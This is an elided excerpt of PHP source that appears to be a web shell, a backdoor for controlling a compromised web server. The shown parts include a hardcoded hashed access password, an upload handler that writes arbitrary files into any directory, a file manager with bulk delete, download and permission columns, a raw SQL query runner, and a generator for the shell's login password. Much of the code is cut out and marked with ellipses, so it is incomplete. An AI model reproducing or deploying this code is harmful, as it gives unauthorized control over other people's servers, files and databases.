...
$pass  = '44f9b65a33dfb2a69cbc8347885c1185';
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	...
	<tr class="alt1">
		<td>
			...
			<a href="javascript:g('pass');">Password Generator</a>
...
if ($action == 'file') {
	...
	elseif ($doupfile) {
		$dosya_sayi = count($_FILES['uploadfile']['name']); 
		for($i=0;$i<$dosya_sayi;$i++)
		{
			m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'][$i], $uploaddir.'/'.$_FILES['uploadfile']['name'][$i]) ? 'success' : 'failed'));
		}
	}
...
<div style="background:#eee;margin-bottom:10px;">
	...
	<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" >
...
p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><div style="float:right;"><input class="input" name="uploadfile[]" multiple="multiple" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$nowpath.'" type="hidden" /><input name="dir" value="'.$nowpath.'" type="hidden" /></div></form>');
	...
	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>
	<td colspan="4">
	<a href="javascript:dofile(\'downrar\');">Packing download selected</a>
	<a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
	p('</form></table>');
}// end dir
							...
							switch(qy($query))
							{
								...
								case 1:
									...
									if ($keyfied && strtolower(substr($query,0,13)) == 'select * from') {
										$query = str_replace(" LIMIT ", " order by $keyfied ASC LIMIT ", $query);
									}
									$result = q($query);
...
elseif ($action == 'pass') {
	...
	formhead(array('title'=>'Password Generator'));
	makehide('action','passgen');
	makeinput(array('title'=>'Type New Password','name'=>'newpass', 'placeholder'=>"tete"));
	p('');
	formfooter();
}//end eval
elseif ($action == 'passgen')
{
	if($newpass == ""){die('Please fill in password form!');}
	$newpass = AR_encoder($newpass);
	echo $newpass;
}
...
function AR_encoder($pass)
{
	$pass = trim(strip_tags($pass));
	return "<strong>Your new password has been generated: </strong>".encode_pass($pass);
}
function formfoot(){
	p('</form>');
}
